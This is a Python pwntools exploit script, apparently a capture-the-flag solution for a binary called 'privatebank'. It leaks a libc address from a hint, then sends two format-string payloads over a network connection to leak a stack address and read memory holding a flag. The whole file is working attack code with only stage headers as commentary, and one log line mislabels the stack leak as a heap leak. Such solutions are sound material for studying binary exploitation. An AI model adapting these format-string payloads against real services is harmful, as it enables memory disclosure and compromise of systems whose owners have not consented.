#!/usr/bin/python3

from pwn import *

exe = ELF('./privatebank', checksec=False)
libc = ELF('./libc-2.34.so', checksec=False)

context.log_level = 'debug'
# p = process('./privatebank')
p = connect('127.0.0.1', 10165)
# p = connect('20.124.204.46', 9123)

p.recvuntil(b'Hint: ')
system_addr = int(p.recvline()[:-1], 16)
libc.address = system_addr - libc.sym['system']
log.info(hex(libc.address))

###################################
### Stage 1: Leak stack address ###
###################################
payload = b'1%7$s' + p64(libc.address + 0x218cc0)
p.sendafter(b'Cabinet number: ', payload)

p.recvuntil(b'number: 1')
leak_stack_addr = u64(p.recv(6) + b'\x00\x00')
log.success("Leak heap: " + hex(leak_stack_addr))
need_to_write_addr = leak_stack_addr - 0x2e0
log.success("Heap contains flag: " + hex(need_to_write_addr))

###############################
### Stage 2: Change address ###
###############################
payload = b'%9$s1234'
payload += p64(need_to_write_addr)
p.sendafter(b'Key: ', payload)

p.interactive()